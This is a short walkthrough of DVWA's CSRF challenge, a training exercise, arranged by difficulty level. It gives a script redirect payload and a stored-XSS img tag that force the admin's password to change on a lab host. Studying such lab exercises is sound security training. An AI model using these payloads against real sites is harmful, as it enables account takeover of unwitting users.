# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/low.php)

Because there are no CSRF tokens this will be as simple as making the user to acces this `http://10.10.150.32/vulnerabilities/csrf/?password_new=NEW_PASS&password_conf=NEW_PASS&Change=Change#`

Like:
```html
<script>window.location="http://10.10.150.32/vulnerabilities/csrf/?password_new=NEW_PASS&password_conf=NEW_PASS&Change=Change#"; </script>
```

# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/medium.php)

This time the Referer is checked. So the request shoud came from this website.
We try an XSS (Stored) attack.

In the `XSS Stored` section we do the following:

Change the `size` and `maxlength` values for the `Name` input field (from browser) with big values(=1000).
We post `<img src="http://10.10.150.32/vulnerabilities/csrf/?password_new=NEW_PASS&password_conf=NEW_PASS&Change=Change#">` as `Name` and whatever as `Message`.
We sign and now, whenever the user `admin` visits this page his password will change.


# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/high.php)

For this challange I wrote this JS script: [test.js](https://github.com/PnzJust/DVWA-v1.10-Write-up/blob/main/CSRF/test.js).


# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/CSP%20Bypass/Sources/impossible.php)
